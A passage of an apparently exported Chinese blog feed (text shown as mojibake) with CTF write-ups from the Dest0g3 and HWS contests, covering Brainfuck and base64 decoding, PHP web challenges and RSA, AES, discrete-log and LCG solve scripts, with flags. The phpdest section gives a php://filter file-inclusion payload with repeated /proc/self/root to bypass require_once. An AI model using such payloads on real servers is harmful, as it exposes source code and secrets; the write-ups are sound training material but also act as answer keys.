-&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&#x27;));<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è¾¨åˆ«æ˜¯Brainfuck/Ook!ç¼–ç ï¼Œä½¿ç”¨åœ¨çº¿å·¥å…·è§£ç ï¼š[Brainfuck/Ook! Obfuscation/Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0c0c85c1672f49479a6dc2be0e5ddf94.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è§£å‡ºè·å¾—ï¼š</p>
<p>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f73ae5e6532e4414b16ffc0539177ed6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>æ¥ç€Hexè½¬æ–‡å­—å°±å¯ä»¥ï¼Œä½¿ç”¨åœ¨çº¿å·¥å…·<a href="https://the-x.cn/zh-cn/encodings/Hex.aspx">HEXè½¬å­—ç¬¦ åå…­è¿›åˆ¶è½¬å­—ç¬¦ hex gb2312 gbk utf8 æ±‰å­—å†…ç è½¬æ¢ - The X åœ¨çº¿å·¥å…· (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0670b90edc9a407f9a1457e45eed2fbc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è·å–flagï¼šDest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>
<h3 id="strangetraffic"><a class="markdownIt-Anchor" href="#strangetraffic"></a> StrangeTraffic</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng">https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€ä¸‹è½½é™„ä»¶ï¼Œè™šæ‹Ÿæœºkaliæ‰“å¼€æ–‡ä»¶ï¼Œwiresharkåˆ†æï¼Œå¯ä»¥çœ‹å‡ºæ˜¯mudbuså·¥æ§æµé‡ã€‚è¿½è¸ªTCPæµï¼Œåœ¨æµ0å¤„çœ‹åˆ°å¯ç–‘çš„ä¸œè¥¿ï¼Œå°†å±•ç°å½¢å¼æ”¹ä¸ºHexè½¬å‚¨</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/40498cc937884428b33e0efc49584871.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>2ã€åœ¨å°¾éƒ¨å­˜åœ¨base64ç‰¹å¾ç¼–ç ï¼Œæ‰‹åŠ¨æå–ï¼š</p>
<p>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7a35322cfd9a4b458cbe866587f2454d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://img-blog.csdnimg.cn/cf147a5e73dd449d98750098326703bd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å–flagï¼šDest0g3{31A5BEA6-F20D-F18A-E8EA-29B4F257108B}</p>
</blockquote>
<h3 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h3>
<p>**é¢˜ç›®æè¿°ï¼š**Let the word tell u</p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip">https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„docmæ–‡ä»¶ï¼Œhintæç¤ºè¯´å…­ä½å°å†™å­—æ¯åŠ å¯†ï¼Œå¹¶ç»™å‡ºäº†ç¬¬ä¸‰ä½å’Œç¬¬äº”ä½ï¼Œäºæ˜¯è€ƒè™‘ç”¨å·¥å…·AOPRT:</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d4f37e4627004af2911f0a31afd5f141.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>çˆ†ç ´äº†å¥½å‡ æ¬¡ï¼Œç»“æœéƒ½ä¸å¯¹ï¼Œåˆ«æ”¾å¼ƒä½¿ç”¨è¯¥æ–¹æ³•ã€‚</p>
</blockquote>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/">http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/</a>(ç¯å¢ƒåœ¨Buuctfä¸€ç›´éƒ½æœ‰ï¼Œå¯ä»¥è‡ªè¡Œæ‰“å¼€ï¼‰</p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€ç‚¹å¼€é“¾æ¥ï¼Œè·å¾—è§£å¯†æºç ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå †å æ³¨å…¥ã€‚æ„å»ºpayloadè¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/15c694e4a91444b9bc0cce7ce6334798.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>æ²¡æœ‰å›æ˜¾ï¼Œå¯¹phpä»£ç å®¡è®¡ï¼Œå‘ç° require_onceå‡½æ•°ï¼Œå‘ç°å¹²è´§äº†</p>
</blockquote>
<blockquote>
<p>require_once() è¯­å¥åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…æ‹¬å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤<a href="http://www.php.cn/php/php-tp-behavior.html">è¡Œä¸º</a>å’Œ require() è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…æ‹¬äº†ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…æ‹¬ã€‚</p>
<p>PHPæœ€æ–°ç‰ˆçš„å°Trick,require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/<span class="built_in">proc</span>/[pid]<span class="string">`è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ï¼Œè€Œ`</span>/<span class="built_in">proc</span>/<span class="variable language_">self</span><span class="string">`æŒ‡çš„æ˜¯å½“å‰è¿›ç¨‹(è‡ªèº«è¿›ç¨‹)çš„pidï¼Œå°±ç±»ä¼¼äºç±»é‡Œé¢çš„`</span>this</span><br></pre></td></tr></table></figure>
<p><code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥</p>
</blockquote>
<blockquote>
<p>æ„é€ payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3af4fa34b35446609646329ab107b20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å¾—flag.phpçš„æºç ï¼Œbase64è§£ç è·å¾—flagï¼š</p>
<p>Dest0g3{f05260c1-70e9-481b-89b1-eb397377f621}</p>
</blockquote>
<h3 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h3>
<p>**é¢˜ç›®æè¿°ï¼š**Post something</p>
<p><strong>é™„ä»¶ä¸‹è½½ï¼š</strong><a href="http://d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81/">d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81</a>(ç¯å¢ƒåœ¨Buuctfä¸€ç›´éƒ½æœ‰ï¼Œå¯ä»¥è‡ªè¡Œæ‰“å¼€ï¼‰</p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€ç‚¹å¼€é“¾æ¥ï¼Œè·å–ç•Œé¢ï¼š</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/e36c7a302fd44ad392077cd7e4e91506.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>2ã€æ²¡å•¥å¹²çš„ï¼Œç›´æ¥ä»£ç å®¡è®¡</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//é«˜äº®æ˜¾ç¤ºï¼Œæ²¡å•¥ç”¨</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;<span class="comment">//è¯»å–fl4g.phpæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//å¯¹dest0g3ä¼ å…¥å‚æ•°â€˜ctfâ€™</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);<span class="comment">//å¯¹æ—¶é—´çš„é™åˆ¶ï¼Œä¸‹åŒ</span></span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;<span class="comment">//å¦‚æœæ—¶é—´ä¸ºå‡ï¼Œåˆ™è¾“å‡ºfl4gï¼Œåä¹‹è¾“å‡º&quot;Try harder!&quot;,å¾ˆæ˜¾ç„¶æ—¶é—´ä¸å¯èƒ½ä¸ºå‡ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(//çœ‹åˆ°è¿™ä¸ªå‡½æ•°ï¼Œå°±æœ‰è§£äº†åæœ‰è¯¦è§£ï¼Œæ—¢å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œæ¯”å¯¹ï¼Œåªè¦è®©ä»–è¿è¡Œé”™è¯¯å°±è¡Œã€‚</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>å¹²è´§ï¼šset_error_handler () å‡½æ•°<strong>è®¾ç½®ç”¨æˆ·è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°</strong>ã€‚. è¯¥å‡½æ•°ç”¨äºåˆ›å»ºè¿è¡Œæ—¶æœŸé—´çš„ç”¨æˆ·è‡ªå·±çš„é”™è¯¯å¤„ç†æ–¹æ³•ã€‚. è¯¥å‡½æ•°ä¼šè¿”å›æ—§çš„é”™è¯¯å¤„ç†ç¨‹åºï¼Œè‹¥å¤±è´¥ï¼Œåˆ™è¿”å› nullã€‚</p>
</blockquote>
<blockquote>
<p>3ã€æ„å»ºæ•°ç»„æŠ¥é”™POSTï¼šctf[]=1</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dff3286ffba6434fac7bb6c3a38f6ec5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å–flagï¼šDest0g3{a57b8d1d-da8f-42ee-a782-3a92bc372ec3}</p>
</blockquote>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py">https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€æ‰“å¼€é™„ä»¶ï¼Œfofaåˆ†è§£nï¼Œå¸¸è§„è§£ã€‚ä¸Šè„šæœ¬ï¼Œè·å–flagã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line">p = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m çš„åè¿›åˆ¶å½¢å¼</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># mæ˜æ–‡</span></span><br><span class="line"><span class="built_in">print</span>(string)  <span class="comment"># ç»“æœä¸º bâ€˜ m â€™ çš„å½¢å¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h3 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py">https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€æ‰“å¼€é™„ä»¶ï¼ŒAESå¸¸è§„è§£ã€‚ä¸Šè„šæœ¬ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">flag = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
</blockquote>
<h3 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py">https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€ç‚¹å¼€é™„ä»¶ï¼Œå°è¯•ç”¨Pohlig-Hellman ç®—æ³•çš„æ–¹æ³•ï¼Œè¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯æƒ³ä¸é€šï¼Œå°±å»æœäº†ä¸€ä¸‹å¯¹powï¼ˆï¼‰é€†è¿ç®—ï¼Œå‘ç°sageæœ‰ç›¸åº”çš„å‡½æ•°ï¼Œå†™è§£å¯†è„šæœ¬ï¼Œæ”¾åˆ°sagemathï¼ˆ<a href="https://sagecell.sagemath.org/">Sage Cell Server (sagemath.org)</a>ï¼‰ä¸­è¿è¡Œã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">d=discrete_log(h,mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¥ç€åœ¨æœ¬åœ°ç¯å¢ƒè¿è¡Œä»¥ä¸‹ä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="number">627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HWS-Crypto</title>
    <url>/2022/08/HWS-Crypto/</url>
    <content><![CDATA[<p>è¿™åœºæ¯”èµ›è¯¶ï¼Œå‚åŠ çš„è«åå…¶å¦™çš„ï¼Œè¿˜æ²¡æ¥å¾—åŠå¤ç°ï¼Œå°±åšå‡ºæ¥ä¸€ä¸ªCryptoã€‚qwq</p>
<span id="more"></span>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3>
<h4 id="hws-easyrsa"><a class="markdownIt-Anchor" href="#hws-easyrsa"></a> HWS-easyRSA</h4>
<h5 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">31893593182018727625473530765941216190921866039118147474754069955393226712079257707838327486268599271803</span></span><br><span class="line">seed0 = <span class="number">25820280412859586557218124484272275594433027771091486422152141535682739897353623931875432576083022273940</span></span><br><span class="line">seed1 = <span class="number">24295465524789348024814588142969609603624462580932512051939198335014954252359986260009296537423802567677</span></span><br><span class="line">seed2 = <span class="number">14963686422550871447791815183480974143372785034397446416396172429864269108509521776424254168481536292904</span></span><br><span class="line"></span><br><span class="line">a = (seed2 - seed1) * gmpy2.invert(seed1 - seed0, m) % m</span><br><span class="line">b = (seed1 - a * seed0) % m</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, m, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (m &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(m, A % m, t, s - A // m * t, N <span class="keyword">or</span> m), -<span class="number">1</span>)[m &lt; <span class="number">1</span>]  <span class="comment"># é€†å…ƒè®¡ç®—</span></span><br><span class="line">ani = MMI(a, m)</span><br><span class="line">seed = seed2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (ani * (seed - b)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
</search>
